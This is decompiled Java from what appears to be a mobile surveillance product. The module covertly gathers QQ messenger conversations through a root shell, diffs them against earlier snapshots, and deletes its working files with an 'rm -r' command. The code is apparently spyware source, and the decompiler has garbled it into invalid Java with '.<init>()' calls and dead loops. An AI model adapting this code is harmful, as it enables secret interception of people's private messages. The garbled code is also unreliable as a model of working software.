package com.vvt.capture.qq.b;

import android.os.SystemClock;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.qq.QQData;
import com.vvt.capture.qq.QQEventReference;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Set;

public class c
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private com.vvt.base.b d;
  
  public c(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  private void b()
  {
    String str1 = a.a(this.c);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    long l = 3000L;
    for (;;)
    {
      try
      {
        SystemClock.sleep(l);
        localObject2 = com.vvt.n.a.d.a.a();
        if (localObject2 == null) {
          continue;
        }
        String str1 = this.c;
        str1 = a.a(str1);
        String str2 = this.c;
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        localObject2 = a.a((String)localObject2, str1, str2, (String)localObject3);
        boolean bool2 = com.vvt.ag.b.a((String)localObject2);
        if (bool2) {
          continue;
        }
        bool2 = a;
        if (bool2) {}
        localHashMap = com.vvt.capture.qq.a.a.a((String)localObject2);
      }
      catch (Exception localException)
      {
        Object localObject2;
        boolean bool3 = b;
        if (!bool3) {
          continue;
        }
        continue;
      }
      finally
      {
        b();
      }
      b();
      localObject2 = new com/vvt/capture/qq/QQEventReference;
      ((QQEventReference)localObject2).<init>();
      ((QQEventReference)localObject2).setReference(localHashMap);
      bool1 = a;
      if (bool1) {}
      return (g)localObject2;
      bool3 = b;
      if (bool3)
      {
        continue;
        bool3 = b;
        if (!bool3) {}
      }
    }
  }
  
  public List a(int paramInt)
  {
    i = a;
    if (i != 0) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    for (;;)
    {
      try
      {
        Object localObject1 = com.vvt.n.a.d.a.a();
        if (localObject1 == null) {
          continue;
        }
        String str = this.c;
        str = a.a(str);
        boolean bool = a;
        if (bool) {}
        Object localObject2 = this.c;
        Object localObject3 = this.d;
        localObject3 = ((com.vvt.base.b)localObject3).f();
        str = a.a((String)localObject1, str, (String)localObject2, (String)localObject3);
        bool = a;
        if (bool) {}
        bool = com.vvt.ag.b.a(str);
        if (bool) {
          continue;
        }
        localObject1 = com.vvt.capture.qq.a.a.a((String)localObject1);
        ArrayList localArrayList2 = new java/util/ArrayList;
        localArrayList2.<init>();
        localObject1 = ((HashMap)localObject1).entrySet();
        Iterator localIterator = ((Set)localObject1).iterator();
        k = paramInt;
        i = localIterator.hasNext();
        if (i == 0) {
          continue;
        }
        localObject1 = localIterator.next();
        Object localObject4 = localObject1;
        localObject4 = (Map.Entry)localObject1;
        localObject3 = localObject4;
        localObject1 = ((Map.Entry)localObject4).getValue();
        localObject1 = (Long)localObject1;
        long l1 = ((Long)localObject1).longValue();
        localObject1 = ((Map.Entry)localObject4).getKey();
        localObject1 = (String)localObject1;
        i = a;
        if (i != 0) {}
        long l2 = 0L;
        i = l1 < l2;
        if (i <= 0) {
          continue;
        }
        localObject1 = this.c;
        localObject2 = ((Map.Entry)localObject3).getKey();
        localObject2 = (String)localObject2;
        localObject3 = ((Map.Entry)localObject3).getValue();
        localObject3 = (Long)localObject3;
        long l3 = ((Long)localObject3).longValue();
        com.vvt.base.b localb = this.d;
        localObject1 = com.vvt.capture.qq.c.a((String)localObject1, str, (String)localObject2, l3, localb);
        bool = a;
        if (bool) {}
        int j = ((ArrayList)localObject1).size();
        if (j <= 0) {
          continue;
        }
        localObject3 = ((ArrayList)localObject1).iterator();
        j = k;
        i = ((Iterator)localObject3).hasNext();
        if (i != 0)
        {
          localObject1 = ((Iterator)localObject3).next();
          localObject1 = (QQData)localObject1;
          if (j > 0)
          {
            localArrayList2.add(localObject1);
            j += -1;
            continue;
          }
        }
        i = j;
      }
      catch (Exception localException)
      {
        int k;
        i = b;
        if (i == 0) {
          continue;
        }
        continue;
        i = k;
        continue;
      }
      k = i;
    }
    i = b;
    if (i != 0) {}
    b();
    for (;;)
    {
      i = a;
      if (i != 0) {}
      return localArrayList1;
      i = b;
      if (i == 0) {}
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1;
    Object localObject4;
    Object localObject5;
    long l1;
    try
    {
      paramg1 = (QQEventReference)paramg1;
      paramg2 = (QQEventReference)paramg2;
      localObject1 = new java/util/HashMap;
      ((HashMap)localObject1).<init>();
      Object localObject2 = paramg1.getReference();
      localObject2 = ((HashMap)localObject2).entrySet();
      localObject4 = ((Set)localObject2).iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject4).hasNext();
        if (!bool1) {
          break label248;
        }
        localObject2 = ((Iterator)localObject4).next();
        localObject2 = (Map.Entry)localObject2;
        localObject5 = ((Map.Entry)localObject2).getKey();
        localObject5 = (String)localObject5;
        localObject2 = ((Map.Entry)localObject2).getValue();
        localObject2 = (Long)localObject2;
        l1 = ((Long)localObject2).longValue();
        localObject2 = paramg2.getReference();
        bool1 = ((HashMap)localObject2).containsKey(localObject5);
        if (!bool1) {
          break;
        }
        localObject2 = paramg2.getReference();
        localObject2 = ((HashMap)localObject2).get(localObject5);
        localObject2 = (Long)localObject2;
        long l2 = ((Long)localObject2).longValue();
        bool1 = l2 < l1;
        if (bool1)
        {
          localObject2 = Long.valueOf(l1);
          ((HashMap)localObject1).put(localObject5, localObject2);
        }
      }
      bool1 = a;
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (!bool1) {}
    }
    for (;;)
    {
      if (bool1) {}
      return localArrayList;
      l1 = 0L;
      Object localObject3 = Long.valueOf(l1);
      ((HashMap)localObject1).put(localObject5, localObject3);
      break;
      label248:
      int i = ((HashMap)localObject1).size();
      boolean bool2;
      if (i > 0)
      {
        localObject3 = com.vvt.n.a.d.a.a();
        boolean bool3 = a;
        if (bool3) {}
        bool3 = com.vvt.ag.b.a((String)localObject3);
        if (!bool3)
        {
          localObject5 = this.c;
          localObject5 = a.a((String)localObject5);
          localObject4 = this.c;
          Object localObject6 = this.d;
          localObject6 = ((com.vvt.base.b)localObject6).f();
          localObject5 = a.a((String)localObject3, (String)localObject5, (String)localObject4, (String)localObject6);
          bool2 = a;
          if (bool2) {}
          localObject3 = ((HashMap)localObject1).entrySet();
          Iterator localIterator = ((Set)localObject3).iterator();
          for (;;)
          {
            bool2 = localIterator.hasNext();
            if (!bool2) {
              break;
            }
            localObject3 = localIterator.next();
            Object localObject7 = localObject3;
            localObject7 = (Map.Entry)localObject3;
            localObject4 = localObject7;
            localObject3 = this.c;
            localObject1 = ((Map.Entry)localObject7).getKey();
            localObject1 = (String)localObject1;
            localObject4 = ((Map.Entry)localObject7).getValue();
            localObject4 = (Long)localObject4;
            long l3 = ((Long)localObject4).longValue();
            com.vvt.base.b localb = this.d;
            localObject3 = com.vvt.capture.qq.c.a((String)localObject3, (String)localObject5, (String)localObject1, l3, localb);
            localArrayList.addAll((Collection)localObject3);
          }
        }
        bool2 = b;
        if (bool2) {}
        b();
      }
      else
      {
        bool2 = a;
        if (!bool2) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */